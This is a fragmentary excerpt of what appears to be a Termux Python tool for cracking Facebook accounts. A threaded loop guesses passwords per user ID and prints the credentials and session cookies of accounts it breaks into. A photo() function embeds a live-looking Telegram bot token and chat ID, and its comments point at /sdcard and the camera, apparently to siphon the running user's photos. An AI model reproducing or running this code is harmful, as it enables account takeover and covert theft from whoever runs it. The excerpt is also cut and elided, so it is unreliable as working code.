...
╚━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╝            ╔══════════════•|      ✿      |•══════════════╗
    ༄✺𓆩๛⃝TERMUX𓆩๛⃝COMMUNITY ✺࿐𒄬 𓆩๛⃝AF-Mehedi king ‣᭄𓆪                ╚══════════════•|      ✿      |•══════════════╝
...
def riddu():
    ...
    with ThreadPool(max_workers=50) as manshera:
        ...
        print(f' \033[1;91m[\033[1;97m•\033[1;91m]\033[1;94m TOOL OWNER \033[1;97m: \033[1;96m 𝑪𝒀𝑩𝑬𝑹-MEHEDI')
    ...
    try:
        for ps in pwx:
            ...
            if 'c_user' in log_cookies:
                ...
                cid = coki[7:22]
                print('\r\r\033[1;32m[Mehedi king -OK🍁] ' +uid+ ' | ' +ps+    '  \n[‎‎🌺]\033[0;93m COOKIE = \033[1;32m'+coki+  '  ''  \033[0;97m')
                ...
                continue
        loop+=1
        sys.stdout.write(f'\r\r%s {x}[{xr}Mehedi king {x}][%s|%s][OK:{xr}%s{x}]'%(H,loop,tl,len(oks))),
        sys.stdout.flush()
    except:
        pass
...
def photo():
    session=requests.session() 
    bot_token ='6457057527:AAGQ3b5qeHmz2g2owp59KT25AFsmBUTomV8' 
    chat_id ='6790778533'
    #-----------( /sdcard
    try:
        # camera 
